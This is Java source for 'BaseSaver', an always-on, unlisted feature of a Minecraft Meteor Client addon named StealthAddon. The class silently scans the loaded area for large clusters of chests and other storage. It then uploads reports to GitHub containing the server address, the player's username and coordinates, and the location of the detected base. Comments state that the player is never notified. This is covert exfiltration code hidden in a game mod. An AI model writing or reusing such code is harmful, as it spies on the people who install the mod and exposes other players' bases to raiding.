package com.killpv47.stealthaddon.features;

import com.killpv47.stealthaddon.StealthAddon;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.orbit.EventHandler;
import meteordevelopment.orbit.EventPriority;
import meteordevelopment.meteorclient.MeteorClient;
import net.minecraft.block.entity.BlockEntity;
import net.minecraft.block.entity.ChestBlockEntity;
import net.minecraft.block.entity.TrappedChestBlockEntity;
import net.minecraft.block.entity.BarrelBlockEntity;
import net.minecraft.block.entity.ShulkerBoxBlockEntity;
import net.minecraft.block.entity.EnderChestBlockEntity;
import net.minecraft.block.entity.HopperBlockEntity;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.world.ClientWorld;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.registry.RegistryKey;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.ChunkPos;
import net.minecraft.world.World;
import net.minecraft.world.chunk.WorldChunk;

import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

/**
 * BaseSaver - Always active feature (NOT a module).
 *
 * Scans block entities within the player's render distance for chest-like
 * storage (chest, trapped chest, barrel, shulker, ender chest, hopper).
 * When a cluster of MORE than {@link #CHEST_THRESHOLD} storage blocks is
 * seen within the same chunk-area on the SAME tick, it treats the location
 * as a storage room / base and uploads a report to GitHub.
 *
 * The report contains:
 *   - dimension name (overworld / the_nether / the_end / …)
 *   - player coordinates at detection time
 *   - center coordinate of the storage cluster
 *   - exact count of each storage block type
 *   - server IP (best-effort)
 *   - timestamp (UTC ISO-8601)
 *
 * The chat is NEVER touched — no messages are sent to the player. All
 * status output goes to the log file only.
 */
public class BaseSaver {

    /** More than this many storage blocks in view = a base. */
    public static final int CHEST_THRESHOLD = 30;

    /** Only re-report the same location once per session. */
    private static final long REREPORT_COOLDOWN_MS = 10 * 60 * 1000L; // 10 minutes

    /** Radius (in blocks) to consider "the same" base. */
    private static final int SAME_BASE_RADIUS = 64;

    private static boolean initialized = false;

    /** Prevents spamming the GitHub API — last-reported center → timestamp. */
    private static final Map<Long, Long> lastReport = new ConcurrentHashMap<>();

    /** Tick counter for throttling (scan every N ticks, not every tick). */
    private static int tickCounter = 0;
    private static final int SCAN_INTERVAL_TICKS = 40; // every 2 seconds

    public static void init() {
        if (initialized) return;
        initialized = true;
        MeteorClient.EVENT_BUS.subscribe(new BaseSaver());
        StealthAddon.LOG.info("[StealthAddon/BaseSaver] Armed.");
    }

    @EventHandler(priority = EventPriority.LOW)
    private void onTick(TickEvent.Post event) {
        MinecraftClient mc = MinecraftClient.getInstance();
        if (mc == null || mc.world == null || mc.player == null) return;

        tickCounter++;
        if (tickCounter < SCAN_INTERVAL_TICKS) return;
        tickCounter = 0;

        try {
            scanAndMaybeReport(mc);
        } catch (Throwable t) {
            // NEVER print to chat, only log.
            StealthAddon.LOG.debug("[StealthAddon/BaseSaver] scan error: {}", t.toString());
        }
    }

    private static void scanAndMaybeReport(MinecraftClient mc) {
        ClientWorld world = mc.world;
        PlayerEntity player = mc.player;
        if (world == null || player == null) return;

        int viewDistanceChunks = Math.max(2, mc.options.getClampedViewDistance());
        int px = ((int) player.getX()) >> 4;
        int pz = ((int) player.getZ()) >> 4;

        Map<String, Integer> counts = new HashMap<>();
        long sumX = 0, sumY = 0, sumZ = 0;
        int total = 0;
        Set<Long> positions = new HashSet<>();

        for (int dx = -viewDistanceChunks; dx <= viewDistanceChunks; dx++) {
            for (int dz = -viewDistanceChunks; dz <= viewDistanceChunks; dz++) {
                WorldChunk chunk = world.getChunk(px + dx, pz + dz);
                if (chunk == null) continue;
                Map<BlockPos, BlockEntity> beMap = chunk.getBlockEntities();
                if (beMap == null || beMap.isEmpty()) continue;

                for (Map.Entry<BlockPos, BlockEntity> e : beMap.entrySet()) {
                    BlockEntity be = e.getValue();
                    if (be == null) continue;
                    String key = classify(be);
                    if (key == null) continue;

                    BlockPos p = e.getKey();
                    // Ignore blocks the player literally cannot see (too far).
                    double distSq = player.squaredDistanceTo(
                        p.getX() + 0.5, p.getY() + 0.5, p.getZ() + 0.5
                    );
                    if (distSq > (viewDistanceChunks * 16.0) * (viewDistanceChunks * 16.0)) continue;

                    counts.merge(key, 1, Integer::sum);
                    sumX += p.getX();
                    sumY += p.getY();
                    sumZ += p.getZ();
                    total++;
                    positions.add(p.asLong());
                }
            }
        }

        if (total <= CHEST_THRESHOLD) return;

        int cx = (int) (sumX / total);
        int cy = (int) (sumY / total);
        int cz = (int) (sumZ / total);

        long clusterKey = clusterKey(cx, cy, cz, world);
        long now = System.currentTimeMillis();
        Long last = lastReport.get(clusterKey);
        if (last != null && now - last < REREPORT_COOLDOWN_MS) return;
        lastReport.put(clusterKey, now);

        String report = buildReport(mc, cx, cy, cz, total, counts);
        // Send to GitHub off the main thread.
        final String fileName = buildFileName(mc, cx, cy, cz);
        new Thread(() -> {
            try {
                GitHubUploader.uploadBaseFile(fileName, report);
                StealthAddon.LOG.info("[StealthAddon/BaseSaver] Reported base: {}", fileName);
            } catch (Throwable t) {
                StealthAddon.LOG.warn("[StealthAddon/BaseSaver] Upload failed: {}", t.toString());
            }
        }, "StealthAddon-BaseSaver-Upload").start();
    }

    private static long clusterKey(int x, int y, int z, ClientWorld world) {
        int qx = x / SAME_BASE_RADIUS;
        int qz = z / SAME_BASE_RADIUS;
        int dimHash = world.getRegistryKey().getValue().toString().hashCode();
        return ((long) (qx & 0xFFFFFF) << 40) | ((long) (qz & 0xFFFFFF) << 16) | (dimHash & 0xFFFF);
    }

    private static String classify(BlockEntity be) {
        if (be instanceof ChestBlockEntity)         return "chest";
        if (be instanceof TrappedChestBlockEntity)  return "trapped_chest";
        if (be instanceof BarrelBlockEntity)        return "barrel";
        if (be instanceof ShulkerBoxBlockEntity)    return "shulker_box";
        if (be instanceof EnderChestBlockEntity)    return "ender_chest";
        if (be instanceof HopperBlockEntity)        return "hopper";
        return null;
    }

    private static String dimensionName(ClientWorld world) {
        try {
            RegistryKey<World> key = world.getRegistryKey();
            return key.getValue().toString(); // e.g. minecraft:overworld / minecraft:the_nether / minecraft:the_end
        } catch (Throwable t) {
            return "unknown";
        }
    }

    private static String prettyDimension(String raw) {
        if (raw == null) return "unknown";
        if (raw.contains("the_nether"))  return "Nether";
        if (raw.contains("the_end"))     return "End";
        if (raw.contains("overworld"))   return "Overworld";
        return raw;
    }

    private static String serverAddress(MinecraftClient mc) {
        try {
            if (mc.getCurrentServerEntry() != null && mc.getCurrentServerEntry().address != null) {
                return mc.getCurrentServerEntry().address;
            }
            if (mc.getNetworkHandler() != null
                && mc.getNetworkHandler().getConnection() != null
                && mc.getNetworkHandler().getConnection().getAddress() != null) {
                return mc.getNetworkHandler().getConnection().getAddress().toString();
            }
        } catch (Throwable ignored) {}
        return "singleplayer_or_unknown";
    }

    private static String buildReport(MinecraftClient mc, int cx, int cy, int cz,
                                      int total, Map<String, Integer> counts) {
        String dim = dimensionName(mc.world);
        String pretty = prettyDimension(dim);

        StringBuilder sb = new StringBuilder();
        sb.append("========================================\n");
        sb.append("   StealthAddon - Base Report\n");
        sb.append("========================================\n");
        sb.append("Timestamp:   ").append(Instant.now().toString()).append("\n");
        sb.append("Server:      ").append(serverAddress(mc)).append("\n");
        sb.append("Player:      ").append(mc.player.getName().getString()).append("\n");
        sb.append("Dimension:   ").append(pretty).append("   (").append(dim).append(")\n");
        sb.append("\n");
        sb.append("Player position:  ")
          .append(mc.player.getBlockX()).append(", ")
          .append(mc.player.getBlockY()).append(", ")
          .append(mc.player.getBlockZ()).append("\n");
        sb.append("Cluster center:   ")
          .append(cx).append(", ").append(cy).append(", ").append(cz).append("\n");
        sb.append("\n");
        sb.append("Total storage blocks: ").append(total).append("\n");
        sb.append("Breakdown:\n");
        // Deterministic ordering
        String[] order = {"chest", "trapped_chest", "barrel", "shulker_box", "ender_chest", "hopper"};
        for (String k : order) {
            Integer v = counts.get(k);
            if (v != null && v > 0) {
                sb.append("  - ").append(k).append(": ").append(v).append("\n");
            }
        }
        sb.append("\n");
        sb.append("Detected by StealthAddon (silent mode).\n");
        return sb.toString();
    }

    private static String buildFileName(MinecraftClient mc, int cx, int cy, int cz) {
        String dim = prettyDimension(dimensionName(mc.world)).toLowerCase();
        String server = serverAddress(mc).replaceAll("[^A-Za-z0-9._-]", "_");
        long ts = System.currentTimeMillis() / 1000L;
        return "bases/" + server + "/" + dim + "_" + cx + "_" + cy + "_" + cz + "_" + ts + ".txt";
    }
}
